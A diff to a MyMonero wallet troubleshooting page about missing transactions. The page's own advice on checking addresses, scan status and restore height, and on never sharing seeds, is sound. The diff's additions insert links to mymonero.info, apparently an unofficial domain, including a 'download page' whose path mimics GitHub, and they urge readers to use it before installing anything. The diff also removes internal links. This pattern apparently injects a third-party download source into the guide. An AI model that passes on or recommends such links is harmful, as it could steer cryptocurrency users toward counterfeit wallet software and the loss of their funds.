@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 A transaction may not appear until the wallet has scanned recent activity, or because you are viewing a different wallet. Check the address, scan status, and transaction details before retrying a payment.
 
+
+The MyMonero.info site covers this in its [MyMonero transaction not showing guide](https://mymonero.info/mymonero-transaction-not-showing). Before installing anything, use the [MyMonero download page](https://mymonero.info/github/monero-projects), and read [the MyMonero FAQ](https://mymonero.info/faq) if anything feels off.
+
 ## You'll see this if
 - Someone says they sent XMR but your wallet history has no entry.
 - A send completed but you cannot find it in the activity list.
@@ -38,8 +41,8 @@ MyMonero desktop's final release is v1.3.3 for Windows (.exe), macOS (.dmg), and
 1. **Identify whether it is incoming or outgoing.** Ask the sender for the relevant non-secret transaction information, or inspect your own wallet record. Never ask anyone to send seed words or private keys. For an exchange transfer, consult that exchange's official deposit status too.
 2. **Verify the receiving wallet.** Compare the address the sender used with the wallet you currently have open. Wallet names can be similar and are not proof of identity. If it is not the expected wallet, locate your own seed backup and restore the correct wallet privately.
 3. **Check the scan indicator.** Let MyMonero finish scanning and update. Keep the app open and connected as appropriate. If it appears stuck, review [MyMonero not syncing](./mymonero-not-syncing.md). Error 523 is general guidance that the server connection is unavailable; it does not prove the transaction or seed is invalid.
-4. **Review restore height.** On a restored wallet, check the starting height. If it is later than the activity you expect, restore or rescan from an earlier suitable height. Earlier scans include more history but take longer. See [restore height explained](./mymonero-restore-height-explained.md).
-5. **Confirm the seed format if restoring.** MyMonero has 13-word legacy, MyMonero-specific seeds and 25-word standard Monero seeds. Use a matching restoration option. Check your own backup for order and spelling; do not paste it into a website. Learn about [restoring a MyMonero wallet](./restore-mymonero-wallet.md).
+4. **Review restore height.** On a restored wallet, check the starting height. If it is later than the activity you expect, restore or rescan from an earlier suitable height. Earlier scans include more history but take longer. See restore height explained.
+5. **Confirm the seed format if restoring.** MyMonero has 13-word legacy, MyMonero-specific seeds and 25-word standard Monero seeds. Use a matching restoration option. Check your own backup for order and spelling; do not paste it into a website. Learn about restoring a MyMonero wallet.
 6. **Wait for pending activity to update.** An incoming amount might not yet be spendable. Check the transaction status and wallet balance after scanning. Do not create another payment request or send a second transfer just because the first is not immediately visible.
 7. **Check the sender's status.** If the sender's wallet or service provides a transaction status, ask them to confirm it was submitted to the address you gave. Share no secret recovery data. If the transfer was through an exchange, its deposit crediting process is separate from wallet scanning.
 8. **Keep records safely.** Retain transaction identifiers privately and compare them with your own history. Avoid publishing identifiers alongside personal information or wallet details.
@@ -51,7 +54,7 @@ MyMonero desktop's final release is v1.3.3 for Windows (.exe), macOS (.dmg), and
 ## If that did not work
 If scanning is current, the address matches, and there is still no activity, follow up with the sender or service that initiated the transfer using its official support channel. Do not assume the wallet can reverse a completed transfer. For an exchange deposit, use the exchange account's transaction status and requirements rather than sending again.
 
-If a transaction appears in history but the amount is unavailable, see [why MyMonero spendable balance is low](./mymonero-spendable-balance-low.md). If the whole balance appears missing, use zero balance troubleshooting. A seed restoration may have selected a different wallet or incorrect scan range; never share the seed as a way to verify it.
+If a transaction appears in history but the amount is unavailable, see why MyMonero spendable balance is low. If the whole balance appears missing, use zero balance troubleshooting. A seed restoration may have selected a different wallet or incorrect scan range; never share the seed as a way to verify it.
 
 MyMonero hosted web wallet login has stopped. Be wary of a web page offering to show hidden transactions if you enter your seed. For the desktop app's published project details, consult the MyMonero desktop repository. The old desktop app is no longer maintained. Consider Cake Wallet as the stated alternative, while checking its supported restore flow directly and keeping the seed private.
 
@@ -92,6 +95,7 @@ No. Never share your seed or private keys. No legitimate helper needs them to ch
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
